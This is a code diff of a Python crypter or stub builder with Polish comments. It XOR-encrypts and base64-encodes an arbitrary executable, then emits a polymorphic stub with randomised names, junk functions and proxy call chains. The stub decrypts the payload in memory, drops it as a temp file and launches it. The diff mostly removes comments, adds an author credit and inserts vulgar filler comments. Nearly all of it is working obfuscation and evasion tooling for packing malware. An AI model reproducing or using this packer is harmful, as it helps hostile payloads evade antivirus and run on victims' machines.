@@ -1,23 +1,22 @@
+# --- code by eddit ---
+# --- https://eddit.me  ---
+
+
 import argparse
 import base64
 import os
 import random
 import string
 import sys
-
-# Funkcja do generowania losowych nazw
 def generate_random_string(length=10):
     """Generuje losowy ciąg znaków."""
     letters = string.ascii_letters
     return ''.join(random.choice(letters) for _ in range(length))
 
-# Funkcja szyfrująca XOR
 def xor_cipher(data: bytes, key: bytes) -> bytes:
     """Szyfruje/deszyfruje dane za pomocą klucza XOR."""
     key_len = len(key)
     return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))
-
-# Szablon stuba z polimorfizmem i ofuskacją
 STUB_TEMPLATE = """
 import base64
 import subprocess
@@ -46,10 +45,8 @@ def {main_func_name}():
     except Exception:
         return
 
-    # Deszyfruj payload w pamięci
     {decrypted_var} = {xor_func_name}({payload_var}, {key_var})
     
-    # Utwórz bezpieczny plik tymczasowy
     suffix = ".exe" if sys.platform == "win32" else ""
     try:
         with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as {tmp_var}:
@@ -58,7 +55,7 @@ def {main_func_name}():
     except Exception:
         return
 
-    # Uruchom plik tymczasowy
+  
     try:
         subprocess.Popen([{tmp_path_var}])
     except Exception:
@@ -71,7 +68,7 @@ def {main_func_name}():
             except Exception:
                 pass
 
-# Funkcje proxy
+
 {proxy_chain}
 
 if __name__ == "__main__":
@@ -117,36 +114,26 @@ def main():
         print(f"BŁĄD: Plik wejściowy '{args.input_file}' nie istnieje.")
         return
 
-    # Wygeneruj losowy klucz
     key = os.urandom(args.key_size)
 
-    # Wczytaj plik wejściowy
     with open(args.input_file, "rb") as f:
         payload = f.read()
 
-    # Zaszyfruj payload
     encrypted_payload = xor_cipher(payload, key)
-
-    # Zakoduj dane do Base64
     b64_payload_str = base64.b64encode(encrypted_payload).decode('utf-8')
     b64_key_str = base64.b64encode(key).decode('utf-8')
-
-    # Generuj losowe nazwy zmiennych i funkcji
     xor_func_name = generate_random_string()
     main_func_name = generate_random_string()
     payload_var = generate_random_string()
     key_var = generate_random_string()
     tmp_var = generate_random_string()
     tmp_path_var = generate_random_string()
-    decrypted_var = generate_random_string()  # Ensure decrypted_var is defined
+    decrypted_var = generate_random_string()  #jebanie w dupe
 
-    # Generuj funkcje śmieciowe, jeśli włączono --flood
     junk_functions = generate_junk_functions(random.randint(5, 15)) if args.flood else ""
 
-    # Generuj łańcuch proxy, jeśli włączono --proxy
     proxy_chain, entry_point = generate_proxy_chain(main_func_name, random.randint(2, 5)) if args.proxy else ("", main_func_name)
 
-    # Wypełnij szablon
     stub_code = STUB_TEMPLATE.format(
         b64_payload=b64_payload_str,
         b64_key=b64_key_str,
@@ -156,13 +143,11 @@ def main():
         key_var=key_var,
         tmp_var=tmp_var,
         tmp_path_var=tmp_path_var,
-        decrypted_var=decrypted_var,  # Add decrypted_var to format
+        decrypted_var=decrypted_var,  # add shit keep stron
         proxy_functions=junk_functions,
         proxy_chain=proxy_chain,
         entry_point=entry_point
     )
-
-    # Zapisz stub do pliku
     with open(args.output, "w", encoding='utf-8') as f:
         f.write(stub_code)
 
